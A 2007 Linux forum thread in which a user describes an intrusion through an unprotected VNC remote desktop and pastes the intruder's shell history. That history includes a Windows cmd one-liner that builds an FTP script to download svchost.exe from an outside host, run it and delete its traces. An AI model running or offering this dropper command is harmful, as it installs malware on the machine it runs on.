---
title: "Remote Desktop Password Is Imperative"
date: 2007-10-31
forum: Desktop Environments
---

### Post by chris.zeman on 2007-10-31
I enabled Remote Desktop on my Ubuntu workstation, and forgot to set a password. :x
I logged in from home, and everything was just as I had left it about an hour beforehand. I had a terminal window and Anjuta open. I pressed the up arrow to execute the last command I had run, and discovered someone had gotten into my machine. Port 5900 is the only port being forwarded to this machine, so I'm assuming that's how the jerk got in.

The funny thing about it is that they tried to execute MS programs.
```

$ 7~
$ %systemroot%\system32\cmd.exe
$ cmd /k echo open ms.microsoft.com 21 > o&echo user mircosoft password >> o &echo get svchost.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &svchost.exe

```

That's all they appeared to have done. Is there anything else I should check for? They didn't mess with my open program, luckily, but it goes to show just how cautious we need to be. This is the ONE time I forgot to password protect incoming connections. 

Chris

---

### Post by JBAlaska on 2007-11-01
That's some super h4x0r LOL.

Always a good idea to change the default port to something obscure as well as set a PW.

Glad to hear your intruder was reta...erm I mean mentally challenged!

---

